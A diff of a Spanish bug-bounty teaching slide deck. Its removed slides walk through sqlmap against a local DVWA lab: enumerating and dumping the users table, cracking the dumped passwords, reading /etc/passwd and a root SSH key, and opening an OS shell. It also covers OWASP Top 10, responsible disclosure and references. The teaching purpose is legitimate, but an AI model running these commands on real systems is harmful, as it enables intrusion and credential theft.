-                    <div class="line"><span class="prompt">$</span> <span class="command">SESSID=$(grep PHPSESSID cookies.txt | awk '{print $NF}')</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \</span></div>
-                    <div class="line"><span class="command">&nbsp;&nbsp;--cookie="PHPSESSID=$SESSID; security=low" \</span></div>
-                    <div class="line"><span class="command">&nbsp;&nbsp;--batch --dbs</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="output" style="color:var(--green)">available databases [2]:</span></div>
-                    <div class="line"><span class="output">[*] dvwa</span></div>
-                    <div class="line"><span class="output">[*] information_schema</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="comment"># 2. Enumerar tablas</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \</span></div>
-                    <div class="line"><span class="command">&nbsp;&nbsp;--cookie="PHPSESSID=$SESSID; security=low" \</span></div>
-                    <div class="line"><span class="command">&nbsp;&nbsp;--batch -D dvwa --tables</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="output">[2 tables]</span></div>
-                    <div class="line"><span class="output">| guestbook |</span></div>
-                    <div class="line"><span class="output">| users     |</span></div>
-                </div>
-
                 <div class="info-box" style="margin-top:0.3em">
-                    <h4>⚠️ Aviso Legal</h4>
-                    <p style="font-size:0.58em">--dbs y --tables solo enumeran, NO modifican datos. Usar solo en sistemas con autorización explícita.</p>
+                    <h4>🎯 Estrategia de Inicio</h4>
+                    <p style="font-size:0.58em"><strong style="color:var(--orange)">Bugcrowd VDP</strong> (sin bounty, aprender) → <strong style="color:var(--green)">Intigriti</strong> (pago, rápida respuesta) → <strong style="color:var(--pink)">HackerOne</strong> (enterprise, grandes payouts)</p>
                 </div>
             </section>
 
-            <!-- SLIDE 11: LIVE DEMO - EXTRACCIÓN -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 17: OWASP TOP 10 — Obstáculos                                -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
-                <h2>Demo SQLi — Paso 3: Extracción</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Extraer datos sensibles (laboratorio local).</p>
-                
-                <div class="terminal" style="font-size:0.48em">
-                    <div class="line"><span class="comment"># Extraer TODOS los usuarios (LAB LOCAL)</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \</span></div>
-                    <div class="line"><span class="command">&nbsp;&nbsp;--cookie="PHPSESSID=$SESSID; security=low" \</span></div>
-                    <div class="line"><span class="command">&nbsp;&nbsp;--batch --dump -D dvwa -T users</span></div>
-                    <div class="line">&nbsp;</div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+----------+------------+--------------------------------+</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">| user_id  | user     | first_name | password                       |</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+----------+------------+--------------------------------+</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 1        | admin    | admin      | 5f4dcc3b5aa765d61d8327deb882cf99 |</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 2        | gordonb  | Gordon     | e99a18c428cb38d5f260853678922e03 |</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 3        | 1337     | Hack       | 8d3533d75ae2c3966d7e0d4fcc69216b |</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 4        | pablo    | Pablo      | 0d107d09f5bbe40cade3de5c71e9e9b7 |</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">| 5        | smithy   | Bob        | 5f4dcc3b5aa765d61d8327deb882cf99 |</span></div>
-                    <div class="line"><span class="output" style="color:var(--doom-gold)">+----------+----------+------------+--------------------------------+</span></div>
+                <div class="phase-indicator">
+                    <span class="num">PARADA 7</span>
+                    <span class="text">Los Obstáculos</span>
                 </div>
-
-                <div class="info-box pink" style="margin-top:0.3em">
-                    <h4>🔴 Hashes Crackeados</h4>
-                    <p style="font-size:0.52em"><code>admin</code> → <code>password</code></p>
-                    <p style="font-size:0.52em"><code>gordonb</code> → <code>123456</code></p>
-                    <p style="font-size:0.52em"><code>1337</code> → <code>charlie</code></p>
-                    <p style="font-size:0.52em"><code>pablo</code> → <code>letmein</code></p>
-                    <p style="font-size:0.52em"><code>smithy</code> → <code>password</code></p>
-                </div>
-            </section>
-
-            <!-- SLIDE 12: LIVE DEMO - IMPACTO -->
-            <section>
-                <h2>Demo SQLi — Paso 4: Impacto</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">De SQLi a compromiso total. Pasos de post-explotación.</p>
+                <h2>🛡️ OWASP Top 10 — Lo que Buscas</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Las vulnerabilidades más buscadas en Bug Bounty.</p>
                 
                 <div class="card-grid two">
-                    <div class="card" style="border-color:var(--pink)">
-                        <h4 style="color:var(--pink)">🔴 Lectura de Archivos</h4>
-                        <div class="terminal" style="font-size:0.45em">
-                            <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --batch --file-read="/etc/passwd"</span></div>
-                            <div class="line"><span class="output">Content of file: root:x:0:0:root:/root:/bin/bash</span></div>
-                        </div>
-                    </div>
-                    <div class="card" style="border-color:var(--orange)">
-                        <h4 style="color:var(--orange)">🟠 RCE (si MySQL root)</h4>
-                        <div class="terminal" style="font-size:0.45em">
-                            <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --os-shell</span></div>
-                            <div class="line"><span class="output">do you want to try to obtain an interactive</span></div>
-                            <div class="line"><span class="output">execution? [Y/n] Y</span></div>
-                            <div class="line"><span class="output" style="color:var(--green)">os-shell> id</span></div>
-                            <div class="line"><span class="output">uid=33(www-data)</span></div>
-                        </div>
-                    </div>
-                    <div class="card" style="border-color:var(--cyan)">
-                        <h4 style="color:var(--cyan)">🔵 Acceso a SSH Keys</h4>
-                        <div class="terminal" style="font-size:0.45em">
-                            <div class="line"><span class="prompt">$</span> <span class="command">sqlmap -r req.txt --file-read="/root/.ssh/id_rsa"</span></div>
-                            <div class="line"><span class="output">→ Private key encontrada</span></div>
-                        </div>
-                    </div>
-                    <div class="card" style="border-color:var(--doom-gold)">
-                        <h4 style="color:var(--doom-gold)">💰 Bounty Real</h4>
-                        <p style="font-size:0.58em"><strong>Severity:</strong> <span style="color:var(--pink)">9.8 CRITICAL</span></p>
-                        <p style="font-size:0.55em">CVSS: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</p>
-                        <p style="font-size:0.55em">Bounty: <strong>$2,000-$50,000</strong></p>
-                    </div>
-                </div>
-
-                <div class="info-box" style="margin-top:0.3em">
-                    <h4>⚠️ Aviso Legal</h4>
-                    <p style="font-size:0.6em">Todos estos comandos son PARA LABORATORIO LOCAL. Hacer --file-read o --os-shell en producción sin autorización = CRIMEN FEDERAL.</p>
-                </div>
-            </section>
-
-            <!-- SLIDE 13: LIVE DEMO - PREVENCIÓN -->
-            <section>
-                <h2>Demo SQLi — Prevención</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Cómo defender aplicaciones contra SQL Injection.</p>
-                
-                <div class="columns">
-                    <div class="info-box pink">
-                        <h4>❌ CÓDIGO VULNERABLE (PHP)</h4>
-                        <pre style="font-size:0.48em;font-family:var(--mono)"><code>$id = $_GET['id'];
-$query = "SELECT * FROM users 
-           WHERE id = '$id'";
-$result = mysqli_query($conn, $query);</code></pre>
-                        <p style="font-size:0.52em;color:var(--pink)">Input del usuario concat-directo en query</p>
-                    </div>
-                    <div class="info-box green">
-                        <h4>✅ CÓDIGO SEGURO (PHP)</h4>
-                        <pre style="font-size:0.48em;font-family:var(--mono)"><code>// Prepared Statements (PDO)
-$stmt = $pdo->prepare(
-  "SELECT * FROM users WHERE id = ?"
-);
-$stmt->execute([$_GET['id']]);
-$result = $stmt->fetch();</code></pre>
-                        <p style="font-size:0.52em;color:var(--green)">Parámetros separados de query</p>
-                    </div>
-                </div>
-
-                <div class="card-grid four" style="margin-top:0.4em">
-                    <div class="card" style="border-color:var(--cyan)"><h4 style="color:var(--cyan)">1. Prepared Statements</h4><p style="font-size:0.55em">SIEMPRE usar parámetros</p></div>
-                    <div class="card" style="border-color:var(--green)"><h4 style="color:var(--green)">2. Least Privilege</h4><p style="font-size:0.55em">DB user sin admin</p></div>
-                    <div class="card" style="border-color:var(--orange)"><h4 style="color:var(--orange)">3. Input Validation</h4><p style="font-size:0.55em">Whitelist de tipos</p></div>
-                    <div class="card" style="border-color:var(--pink)"><h4 style="color:var(--pink)">4. WAF</h4><p style="font-size:0.55em">Web App Firewall</p></div>
-                </div>
-            </section>
-
-            <!-- SLIDE 14: ESTADÍSTICAS CIENTÍFICAS 2025 -->
-            <section>
-                <h2>Estado del Arte — Datos 2025</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Métricas de estudios científicos y reportes de la industria. Ver referencias [1]-[7].</p>
-                
-                <div class="card-grid four">
-                    <div class="card" style="border-color:var(--pink)">
-                        <h4 style="color:var(--pink)">📊 CVEs 2025</h4>
-                        <p style="font-size:0.55em">40,009 CVEs publicados en 2024 [1]</p>
-                        <p style="font-size:0.48em;color:var(--pink)">+18% vs 2023</p>
-                        <p style="font-size:0.48em">~130 CVEs/día</p>
-                    </div>
-                    <div class="card" style="border-color:var(--orange)">
-                        <h4 style="color:var(--orange)">🎯 Severidad</h4>
-                        <p style="font-size:0.55em">38% High/Critical [1]</p>
-                        <p style="font-size:0.48em;color:var(--orange)">Critical: 9.8+</p>
-                        <p style="font-size:0.48em">14.8% vulns web son críticas</p>
-                    </div>
-                    <div class="card" style="border-color:var(--green)">
-                        <h4 style="color:var(--green)">💰 Mercado BB</h4>
-                        <p style="font-size:0.55em">$1.76B (2025) → $6.67B (2034) [5]</p>
-                        <p style="font-size:0.48em;color:var(--green)">CAGR: 15.94%</p>
-                    </div>
-                    <div class="card" style="border-color:var(--cyan)">
-                        <h4 style="color:var(--cyan)">🐛 Bug Bounty</h4>
-                        <p style="font-size:0.55em">$850 pago promedio [2]</p>
-                        <p style="font-size:0.48em;color:var(--cyan)">$65,000 máximo [2]</p>
-                        <p style="font-size:0.48em">32,000 hunters (+74%) [2]</p>
-                    </div>
-                </div>
-
-                <div class="columns" style="margin-top:0.4em">
-                    <div class="info-box pink">
-                        <h4>🔴 Explotación 0-Day [7]</h4>
-                        <ul style="font-size:0.58em">
-                            <li>28% de exploits en 24h post-CVE</li>
-                            <li>161 vulns explotadas en producción (H1 2025)</li>
-                            <li>20% más exploits in-the-wild vs 2023</li>
-                        </ul>
-                    </div>
-                    <div class="info-box green">
-                        <h4>🟢 CISA KEV [1]</h4>
-                        <ul style="font-size:0.58em">
-                            <li>1,275 vulnerabilidades conocidas explotadas</li>
-                            <li>320 añadidas en 2024</li>
-                            <li>768 CVEs explotadas por primera vez</li>
-                        </ul>
-                    </div>
-                </div>
-            </section>
-
-            <!-- SLIDE 15: OWASP TOP 10 2021 -->
-            <section>
-                <h2>OWASP Top 10 — Scope Común</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Las vulnerabilidades más buscadas en Bug Bounty. Ver [8], [9], [2].</p>
-                
-                <div class="card-grid two">
-                    <div class="card" style="border-color:var(--pink)">
+                    <div class="card" style="border-left:3px solid var(--pink)">
                         <h4 style="color:var(--pink)">A01 — Broken Access Control</h4>
-                        <p style="font-size:0.55em">IDOR, BOLA, Privilege escalation</p>
-                        <p style="font-size:0.52em;color:var(--green)">#1 Global — 58% critical/high [2]</p>
+                        <p style="font-size:0.52em">IDOR, BOLA, Privilege Escalation</p>
+                        <p style="font-size:0.48em;color:var(--green)">#1 Global — 58% Critical [2]</p>
                     </div>
-                    <div class="card" style="border-color:var(--orange)">
+                    <div class="card" style="border-left:3px solid var(--orange)">
                         <h4 style="color:var(--orange)">A02 — Cryptographic Failures</h4>
-                        <p style="font-size:0.55em">Exposed secrets, weak crypto</p>
-                        <p style="font-size:0.52em;color:var(--orange)">67% de apps vulnerables [1]</p>
+                        <p style="font-size:0.52em">Exposed secrets, weak crypto</p>
+                        <p style="font-size:0.48em;color:var(--orange)">67% apps vulnerables [1]</p>
                     </div>
-                    <div class="card" style="border-color:var(--green)">
+                    <div class="card" style="border-left:3px solid var(--green)">
                         <h4 style="color:var(--green)">A03 — Injection</h4>
-                        <p style="font-size:0.55em">SQLi, XSS, SSRF, Command Injection</p>
-                        <p style="font-size:0.52em;color:var(--green)">47% frecuencia — CVSS 9.8 [8]</p>
+                        <p style="font-size:0.52em">SQLi, XSS, SSRF, Command Inj.</p>
+                        <p style="font-size:0.48em;color:var(--green)">CVSS 9.8 típico</p>
                     </div>
-                    <div class="card" style="border-color:var(--cyan)">
+                    <div class="card" style="border-left:3px solid var(--cyan)">
                         <h4 style="color:var(--cyan)">A04 — Insecure Design</h4>
-                        <p style="font-size:0.55em">Business logic flaws, race conditions</p>
-                        <p style="font-size:0.52em;color:var(--cyan)">68% interest hunters [2]</p>
+                        <p style="font-size:0.52em">Business logic, race conditions</p>
+                        <p style="font-size:0.48em;color:var(--cyan)">68% interés hunters [2]</p>
                     </div>
-                    <div class="card" style="border-color:var(--doom-gold)">
-                        <h4 style="color:var(--doom-gold)">A05 — Security Misconfiguration</h4>
-                        <p style="font-size:0.55em">Default creds, debug enabled</p>
-                        <p style="font-size:0.52em;color:var(--doom-gold)">53% LOW severity [1]</p>
+                    <div class="card" style="border-left:3px solid var(--gold)">
+                        <h4 style="color:var(--gold)">A05 — Security Misconfiguration</h4>
+                        <p style="font-size:0.52em">Default creds, debug enabled</p>
+                        <p style="font-size:0.48em;color:var(--gold)">Fácil de encontrar</p>
                     </div>
-                    <div class="card" style="border-color:var(--silver)">
-                        <h4 style="color:var(--silver)">A06 — Vulnerable Components</h4>
-                        <p style="font-size:0.55em">Outdated libraries, known CVEs</p>
-                        <p style="font-size:0.52em;color:var(--silver)">27% frecuencia — Supply chain [8]</p>
+                    <div class="card" style="border-left:3px solid var(--purple)">
+                        <h4 style="color:var(--purple)">A06 — Vulnerable Components</h4>
+                        <p style="font-size:0.52em">Outdated libs, known CVEs</p>
+                        <p style="font-size:0.48em;color:var(--purple)">Supply chain attacks</p>
                     </div>
                 </div>
 
                 <div class="info-box cyan" style="margin-top:0.3em">
-                    <h4>📚 PortSwigger Academy</h4>
-                    <p style="font-size:0.6em">Laboratorios gratuitos para practicar cada categoría: <a href="https://portswigger.net/web-security" target="_blank">portswigger.net/web-security</a></p>
+                    <h4>📚 Practica gratis</h4>
+                    <p style="font-size:0.58em"><a href="https://portswigger.net/web-security" target="_blank">PortSwigger Academy</a> — 300+ labs gratuitos para cada categoría OWASP</p>
                 </div>
             </section>
 
-            <!-- SLIDE 16: ROADMAP -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 18: RESPONSIBLE DISCLOSURE                                   -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
-                <h2>Roadmap — Tu Primer Bounty</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Trayectoria recomendada basada en experiencia propia.</p>
+                <h2>⚖️ Responsible Disclosure</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">El código ético que protege a investigadores y empresas.</p>
                 
-                <div class="card-grid four">
-                    <div class="card" style="border-color:var(--cyan)">
-                        <h4 style="color:var(--cyan)">SEMANA 1-2</h4>
-                        <p style="font-size:0.55em">Fundamentos</p>
-                        <div style="margin-top:0.15em">
-                            <p style="font-size:0.48em">• DVWA (todos los niveles)</p>
-                            <p style="font-size:0.48em">• OWASP Juice Shop</p>
-                            <p style="font-size:0.48em">• PortSwigger Academy</p>
-                        </div>
-                        <p style="font-size:0.48em;color:var(--cyan)">Meta: HTTP, OWASP Top 10</p>
+                <div style="display:flex;align-items:center;justify-content:center;gap:15px;margin:0.5em 0">
+                    <div style="text-align:center;background:rgba(125,207,255,0.08);padding:0.5em 1em;border-radius:8px">
+                        <p style="font-size:0.65em;color:var(--cyan);margin:0;font-weight:600">Día 0</p>
+                        <p style="font-size:0.5em;margin:0">Reporte privado</p>
                     </div>
-                    <div class="card" style="border-color:var(--green)">
-                        <h4 style="color:var(--green)">SEMANA 3-4</h4>
-                        <p style="font-size:0.55em">Herramientas</p>
-                        <div style="margin-top:0.15em">
-                            <p style="font-size:0.48em">• Burp Suite Community</p>
-                            <p style="font-size:0.48em">• Nuclei, ffuf</p>
-                            <p style="font-size:0.48em">• TryHackMe Jr Pentester</p>
-                        </div>
-                        <p style="font-size:0.48em;color:var(--green)">Meta: Flujo de trabajo</p>
+                    <span style="color:var(--gold)">→</span>
+                    <div style="text-align:center;background:rgba(158,206,106,0.08);padding:0.5em 1em;border-radius:8px">
+                        <p style="font-size:0.65em;color:var(--green);margin:0;font-weight:600">Día 1-7</p>
+                        <p style="font-size:0.5em;margin:0">Acknowledgment</p>
                     </div>
-                    <div class="card" style="border-color:var(--orange)">
-                        <h4 style="color:var(--orange)">SEMANA 5-8</h4>
-                        <p style="font-size:0.55em">Primeros VDPs</p>
-                        <div style="margin-top:0.15em">
-                            <p style="font-size:0.48em">• Bugcrowd VDPs</p>
-                            <p style="font-size:0.48em">• Open Bug Bounty</p>
-                            <p style="font-size:0.48em">• Intigriti (euandroids)</p>
-                        </div>
-                        <p style="font-size:0.48em;color:var(--orange)">Meta: Primer informe enviado</p>
+                    <span style="color:var(--gold)">→</span>
+                    <div style="text-align:center;background:rgba(255,158,100,0.08);padding:0.5em 1em;border-radius:8px">
+                        <p style="font-size:0.65em;color:var(--orange);margin:0;font-weight:600">Día 30</p>
+                        <p style="font-size:0.5em;margin:0">Status update</p>
                     </div>
-                    <div class="card" style="border-color:var(--pink)">
-                        <h4 style="color:var(--pink)">SEMANA 9-12</h4>
-                        <p style="font-size:0.55em">Programa Real</p>
-                        <div style="margin-top:0.15em">
-                            <p style="font-size:0.48em">• Intigriti (pagos)</p>
-                            <p style="font-size:0.48em">• HackerOne VDPs</p>
-                            <p style="font-size:0.48em">• Standoff 365</p>
-                        </div>
-                        <p style="font-size:0.48em;color:var(--pink)">Meta: ¡Primer bounty!</p>
+                    <span style="color:var(--gold)">→</span>
+                    <div style="text-align:center;background:rgba(247,118,142,0.08);padding:0.5em 1em;border-radius:8px">
+                        <p style="font-size:0.65em;color:var(--pink);margin:0;font-weight:600">Día 90</p>
+                        <p style="font-size:0.5em;margin:0">Fix deadline</p>
                     </div>
-                </div>
-
-                <div class="info-box" style="margin-top:0.3em">
-                    <h4>💰 Rangos de Recompensa por Severidad (CVSS)</h4>
-                    <p style="font-size:0.6em">
-                        <strong style="color:var(--cyan)">Low (3.0-3.9):</strong> $100-$500 | 
-                        <strong style="color:var(--orange)">Medium (4.0-6.9):</strong> $500-$2,000 | 
-                        <strong style="color:var(--pink)">High (7.0-8.9):</strong> $2,000-$10,000 | 
-                        <strong style="color:var(--doom-gold)">Critical (9.0-10):</strong> $10,000+
-                    </p>
-                </div>
-            </section>
-
-            <!-- SLIDE 17: RESPONSIBLE DISCLOSURE -->
-            <section>
-                <h2>Responsible Disclosure</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Marco ético y legal que protege al investigador y a la organización.</p>
-
-                <div class="card-grid four" style="margin-top:0.3em">
-                    <div class="card" style="border-color:var(--cyan)"><h4 style="color:var(--cyan)">Día 0</h4><p style="font-size:0.55em">Reporte privado a vendor</p><p style="font-size:0.5em;color:var(--text-muted)">NDA si aplica</p></div>
-                    <div class="card" style="border-color:var(--green)"><h4 style="color:var(--green)">Día 1-7</h4><p style="font-size:0.55em">Acknowledgment</p><p style="font-size:0.5em;color:var(--text-muted)">Confirmación</p></div>
-                    <div class="card" style="border-color:var(--orange)"><h4 style="color:var(--orange)">Día 30</h4><p style="font-size:0.55em">Status update</p><p style="font-size:0.5em;color:var(--text-muted)">Progreso</p></div>
-                    <div class="card" style="border-color:var(--pink)"><h4 style="color:var(--pink)">Día 90</h4><p style="font-size:0.55em">Fix deadline</p><p style="font-size:0.5em;color:var(--text-muted)">CVE publicado</p></div>
                 </div>
 
                 <div class="columns" style="margin-top:0.4em">
                     <div class="info-box green">
                         <h4>✅ Buenas Prácticas</h4>
                         <ul style="font-size:0.58em">
-                            <li>Plataforma como mediador oficial</li>
-                            <li>No comunicarse directamente con medios</li>
-                            <li>Esperar 90 días antes de publicación pública</li>
-                            <li>PoC que no perjudique datos reales</li>
+                            <li>Usar plataforma como mediador</li>
+                            <li>Esperar 90 días antes de publicar</li>
+                            <li>PoC sin afectar datos reales</li>
+                            <li>Documentar metodología completa</li>
                         </ul>
                     </div>
                     <div class="info-box pink">
-                        <h4>⚠️ Errores Comunes</h4>
+                        <h4>❌ Errores Comunes</h4>
                         <ul style="font-size:0.58em">
                             <li>Contactar developers directamente</li>
                             <li>Publicar antes de 90 días</li>
                             <li>Over-testing (DoS accidental)</li>
-                            <li>No documentar metodología</li>
+                            <li>No usar channel oficial</li>
                         </ul>
                     </div>
                 </div>
             </section>
 
-            <!-- SLIDE 18: RECURSOS -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 19: COFRE DEL SABIO — Recursos                               -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
-                <h2>Kit de Inicio — Recursos</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Todo lo necesario para comenzar — 100% gratuito.</p>
+                <div class="phase-indicator">
+                    <span class="num">PARADA 8</span>
+                    <span class="text">Cofre del Sabio</span>
+                </div>
+                <h2>📚 Kit de Inicio — 100% Gratuito</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Todo lo necesario para comenzar tu viaje.</p>
                 
-                <div class="card-grid two" style="margin-top:0.3em">
-                    <div class="card" style="border-color:var(--green)">
-                        <h4 style="color:var(--green)">📚 Aprender</h4>
-                        <ul style="font-size:0.58em">
-                            <li><a href="https://portswigger.net/web-security" target="_blank">PortSwigger Academy</a><br><span style="font-size:0.5em;color:var(--text-muted)">Laboratorios gratuitos, 300+ labs</span></li>
-                            <li><a href="https://tryhackme.com" target="_blank">TryHackMe</a><br><span style="font-size:0.5em;color:var(--text-muted)">Rutas de aprendizaje, rooms</span></li>
-                            <li><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank">OWASP WSTG</a><br><span style="font-size:0.5em;color:var(--text-muted)">Guía de testing oficial</span></li>
+                <div class="card-grid two">
+                    <div class="card" style="border-left:3px solid var(--green)">
+                        <h4 style="color:var(--green)">📖 Aprender</h4>
+                        <ul style="font-size:0.55em">
+                            <li><a href="https://portswigger.net/web-security" target="_blank">PortSwigger Academy</a> — 300+ labs</li>
+                            <li><a href="https://tryhackme.com" target="_blank">TryHackMe</a> — Rutas guiadas</li>
+                            <li><a href="https://owasp.org/www-project-web-security-testing-guide/" target="_blank">OWASP WSTG</a> — Guía oficial</li>
                         </ul>
                     </div>
-                    <div class="card" style="border-color:var(--cyan)">
+                    <div class="card" style="border-left:3px solid var(--cyan)">
                         <h4 style="color:var(--cyan)">🛠️ Herramientas</h4>
-                        <ul style="font-size:0.58em">
-                            <li><a href="https://portswigger.net/burp" target="_blank">Burp Suite Community</a><br><span style="font-size:0.5em;color:var(--text-muted)">Proxy, repeater, intruder</span></li>
-                            <li><a href="https://github.com/projectdiscovery/nuclei" target="_blank">Nuclei</a><br><span style="font-size:0.5em;color:var(--text-muted)">Scanner de vulnerabilidades</span></li>
-                            <li><a href="https://github.com/ffuf/ffuf" target="_blank">ffuf</a><br><span style="font-size:0.5em;color:var(--text-muted)">Fuzzer web ultra rápido</span></li>
+                        <ul style="font-size:0.55em">
+                            <li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a> — Proxy, Repeater</li>
+                            <li><a href="https://github.com/projectdiscovery/nuclei" target="_blank">Nuclei</a> — Scanner vulns</li>
+                            <li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank">SQLMap</a> — SQLi automated</li>
                         </ul>
                     </div>
                 </div>
@@ -821,342 +924,75 @@ $result = $stmt->fetch();</code></pre>
                 <div class="terminal" style="margin-top:0.3em;font-size:0.52em">
                     <div class="line"><span class="comment"># Instalar herramientas esenciales</span></div>
                     <div class="line"><span class="prompt">$</span> <span class="command">go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">go install -v github.com/ffuf/ffuf/v2@latest</span></div>
-                    <div class="line"><span class="prompt">$</span> <span class="command">pip3 install sqlmap wig httpx subfinder</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">pip3 install sqlmap</span></div>
+                    <div class="line"><span class="prompt">$</span> <span class="command">brew install subfinder httpx naabu</span></div>
                 </div>
             </section>
 
-            <!-- SLIDE 19: CITAS EN TEXTO -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 20: REFERENCIAS — IEEE Format                                -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
-                <h2>Citas en el Texto</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Formato IEEE — Citas numeradas según orden de aparición.</p>
+                <h2>📚 Referencias — Formato IEEE</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Fuentes verificadas y datos científicos 2025.</p>
                 
-                <div class="columns">
-                    <div class="info-box cyan">
-                        <h4>📖 Referencias Primarias</h4>
-                        <ul style="font-size:0.55em">
-                            <li><strong>[1]</strong> Edgescan — CVEs y severidad</li>
-                            <li><strong>[2]</strong> Standoff/PT — Bug Bounty stats</li>
-                            <li><strong>[3]</strong> Bugcrowd — Vulnerabilidades</li>
-                            <li><strong>[4]</strong> YesWeHack — Europa/GDPR</li>
-                        </ul>
-                    </div>
-                    <div class="info-box green">
-                        <h4>📊 Referencias Secundarias</h4>
-                        <ul style="font-size:0.55em">
-                            <li><strong>[5]</strong> Business Research — Mercado</li>
-                            <li><strong>[6]</strong> Statista — Estadísticas</li>
-                            <li><strong>[7]</strong> Deepstrike — Zero-days</li>
-                            <li><strong>[8-11]</strong> OWASP, MITRE, ISO, NIST</li>
-                        </ul>
-                    </div>
-                </div>
-
-                <div class="info-box" style="margin-top:0.4em">
-                    <h4>💡 Ejemplos de Cita en el Texto</h4>
-                    <div style="font-size:0.55em;display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin-top:0.2em">
-                        <p><span style="color:var(--cyan)">"40,009 CVEs publicados"</span> → [1]</p>
-                        <p><span style="color:var(--cyan)">"$850 pago promedio"</span> → [2]</p>
-                        <p><span style="color:var(--cyan)">"88% incremento hardware"</span> → [3]</p>
-                        <p><span style="color:var(--cyan)">"CAGR 15.94%"</span> → [5]</p>
-                    </div>
+                <div style="font-size:0.48em;text-align:left;max-height:60vh;overflow-y:auto">
+                    <p class="bib-item"><span class="ref">[1]</span> Edgescan, "Vulnerability Statistics Report 2025," 10th ed., Jan. 2025. [Online]. Available: https://info.edgescan.com</p>
+                    <p class="bib-item"><span class="ref">[2]</span> A. Vyatkina, "Standoff Bug Bounty platform: 2025 year in review," Positive Technologies, Mar. 2026. [Online]. Available: https://global.ptsecurity.com</p>
+                    <p class="bib-item"><span class="ref">[3]</span> Bugcrowd Inc., "Inside the Mind of a CISO 2025," Sep. 2025. [Online]. Available: https://www.bugcrowd.com/resources</p>
+                    <p class="bib-item"><span class="ref">[4]</span> YesWeHack, "Bug Bounty Report 2025 Edition," Jan. 2025. [Online]. Available: https://yeswehack.com</p>
+                    <p class="bib-item"><span class="ref">[5]</span> Business Research Insights, "Bug Bounty Platforms Market Report," 2025. [Online]. Available: https://www.businessresearchinsights.com</p>
+                    <p class="bib-item"><span class="ref">[6]</span> Statista, "Bug Bounty Market Size 2020-2028," 2025. [Online]. Available: https://www.statista.com</p>
+                    <p class="bib-item"><span class="ref">[7]</span> Deepstrike, "Vulnerability Statistics 2025," Oct. 2025. [Online]. Available: https://deepstrike.io</p>
+                    <p class="bib-item"><span class="ref">[8]</span> OWASP Foundation, "OWASP Top 10:2021," 2021. [Online]. Available: https://owasp.org/www-project-top-ten/</p>
+                    <p class="bib-item"><span class="ref">[9]</span> MITRE, "CWE View: Weaknesses Enumerated in the OWASP Top 25," 2023. [Online]. Available: https://cwe.mitre.org</p>
+                    <p class="bib-item"><span class="ref">[10]</span> ISO/IEC, "ISO/IEC 29147:2018 — Vulnerability disclosure," 2018.</p>
+                    <p class="bib-item"><span class="ref">[11]</span> NIST, "SP 800-53 Rev. 5 — Security Controls," Dec. 2020.</p>
                 </div>
             </section>
 
-            <!-- SLIDE 20: REPORTES DE INDUSTRIA -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
+            <!-- SLIDE 21: CONTACTO + GRACIAS                                       -->
+            <!-- ═══════════════════════════════════════════════════════════════════ -->
             <section>
-                <h2>📚 Referencias — Reportes de Industria</h2>
-                <p style="font-size:0.62em;color:var(--text-muted)">Fuentes primarias de datos 2025-2026.</p>
+                <h2 style="font-size:1.8em;color:var(--gold)">¡Gracias!</h2>
+                <p style="font-size:0.72em;color:var(--text);margin:0.3em 0">Diego Medardo Saavedra García</p>
+                <p style="font-size:0.62em;color:var(--text-muted)">Prof. ESPE, UIDE, Abacom | Máster UCM</p>
                 
-                <div class="card-grid two">
-                    <div class="card" style="border-color:var(--pink);border-width:2px">
-                        <div style="display:flex;align-items:center;gap:8px;margin-bottom:0.3em">
-                            <span style="font-size:1.5em">📊</span>
-                            <h4 style="color:var(--pink)">[1] Edgescan 2025</h4>
-                        </div>
